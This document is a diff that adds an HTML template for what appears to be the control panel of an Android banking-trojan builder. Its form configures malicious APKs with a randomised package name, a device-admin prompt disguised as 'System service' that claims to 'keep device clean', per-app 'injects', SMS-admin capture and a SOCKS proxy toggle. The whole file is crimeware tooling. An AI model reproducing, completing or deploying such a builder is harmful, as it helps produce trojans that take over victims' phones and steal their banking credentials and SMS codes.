@@ -1,0 +1,109 @@
+<h1 class='text-center' style='margin-bottom: -50px'>Edit template</h1>
+<div class='row'>
+	<div class='col-md-2'>
+		<a href='start.py?action=index&client_id=%CLIENT_ID%'>
+		<button class='btn btn-primary'>Back</button>
+		</a>
+	</div>
+	<div class='col-md-10 text-right'>
+		%MESSAGE%
+		<form method='post' action='start.py?tpl_id=%TPL_ID%&action=edit_tpl'>
+			<input type='hidden' name='save_form' value='1' />
+		<button class='btn btn-success' name='submethod' value='save'>Save</button>
+		<button class='btn btn' name='submethod' value='clone'>Clone</button>
+	</div>
+</div>
+<div style='clear:both'>&nbsp;</div>
+<div class='row'>
+	
+	<table class='table table-bordered'>
+		<tr>
+			<td>
+				<div class='input-group'>
+					<div class='input-group-addon'>Package name</div>
+<!-- %PACKAGE_NAME% -->
+					<input type='text' class='form-control' placeholder='com.ass' name='package_name' value='RANDOM' disabled />
+				</div>
+			</td>
+			<td>
+				<div class='input-group'>
+					<div class='input-group-addon'>App name</div>
+					<input type='text' class='form-control' name='app_name' value='%APP_NAME%' />
+				</div>
+			</td>
+		</tr>
+		
+		<tr>
+			<td style='width: 50%'>
+				<div class='input-group'>
+					<div class='input-group-addon'>Device admin label</div>
+					<input type='text' class='form-control' name='device_admin_label' placeholder='System service' value='%DEVICE_ADMIN_LABEL%' />
+				</div>
+			</td><td>
+				<div class='input-group'>
+					<div class='input-group-addon'>Device admin description</div>
+					<input type='text' class='form-control' name='device_admin_descr' disabled placeholder='Allow keep device clean' value='%DEVICE_ADMIN_DESCR%' />
+				</div>
+			</td>
+		</tr>
+		
+		<tr>
+			<td style='width: 50%'>
+				<div class='input-group'>
+					<div class='input-group-addon'>Client</div>
+					<select name='client_id' class='form-control text-warning'>%CLIENT_SELECT%</select>
+				</div>
+			</td>
+			<td>
+				<div class='input-group'>
+					<div class='input-group-addon'>Icon set</div>
+					<select name='icon_set' onchange='showIcon(this.options[this.selectedIndex].value)' class='form-control text-danger'>%ICON_SELECT%</select>
+				</div>
+			</td>
+		</tr>
+		
+		<tr>
+			<td style='width: 50%'>
+				<div class='input-group'>
+					<div class='input-group-addon'>API tag</div>
+					<input type='text' class='form-control' name='api' value='%API%' />
+				</div>
+			</td>
+			<td style='text-align: center'>
+				<img id='icon' style='display: none' src='' />
+			</td>
+		</tr>
+		
+		<tr>
+			<td style='width: 50%'>
+				<div class='input-group'>
+					<div class='input-group-addon'>Injects modifier<br /><br />Example:<br />add.apk.com<br />-remove.apk.com</div>
+					<textarea class='form-control' style='height: 200px' name='injects'>%INJECTS%</textarea>
+				</div>
+			</td>
+			<td style='text-align: center'>
+				<div class='input-group'>
+					<div class='input-group-addon'>SMS admin required</div>
+					<select class='form-control' name='sms_admin_mode'>
+						%SMS_ADMIN_MODE%
+					</select>
+				</div>
+			<br />
+				<div class='input-group'>
+					<div class='input-group-addon'>Socks enabled
+					<input class='form-control' type='checkbox' name='socks_enabled' %SOCKS_ENABLED% /></div>
+				</div>
+			</td>
+		</tr>
+	</table>
+</div>
+
+</form>
+<script>
+function showIcon(name)
+{
+	$('#icon').attr('src', 'app_icons/'+name+'/drawable-xhdpi/ic_launcher181.png')
+	$('#icon').show()
+}
+showIcon('%ICON_FIRST%')
+</script>
